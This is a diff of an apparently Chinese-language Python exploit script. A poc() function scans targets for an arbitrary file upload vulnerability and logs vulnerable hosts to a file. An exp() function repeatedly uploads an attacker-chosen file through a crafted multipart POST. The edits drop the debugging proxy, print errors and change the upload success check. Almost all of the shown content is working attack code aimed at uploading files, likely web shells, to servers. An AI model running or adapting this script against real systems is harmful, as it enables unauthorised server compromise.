@@ -56,7 +56,7 @@ def poc(target):
         'https': 'http://127.0.0.1:8080'
     }
     try:
-        response = requests.post(url=target+playload, headers=headers, data=data, verify=False, timeout=10,proxies=proxies)
+        response = requests.post(url=target+playload, headers=headers, data=data, verify=False, timeout=10)
         if response.status_code == 200 and "1.php" in response.text:
             print(f"[+] 存在任意文件上传漏洞 {target}")
             with open('result.txt', 'a') as f:
@@ -65,7 +65,8 @@ def poc(target):
         else:
             print(f"[-] 不存在任意文件上传漏洞 {target}")
     except Exception as e:
-        pass
+        print(e)
+        # pass
 def exp(target):
     print("--------------正在进行漏洞利用--------------")
     while True:
@@ -90,11 +91,11 @@ def exp(target):
             "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--\r\n"
         )
         proxies = {
-            'http': 'http://127.0.0.1:8080',
-            'https': 'http://127.0.0.1:8080'
+            'http': 'http://127.0.0.1:7890',
+            'https': 'http://127.0.0.1:7890'
         }
-        res = requests.post(url=target+playload, headers=headers, data=data,verify=False,timeout=10,proxies=proxies)
-        if res.status_code == 200 and "attachment" in res.text:
+        res = requests.post(url=target+playload, headers=headers, data=data,verify=False,timeout=10)
+        if res.status_code == 200 and f"{file}" in res.text:
             print(f"上传成功！")
         else:
             print("不存在！")
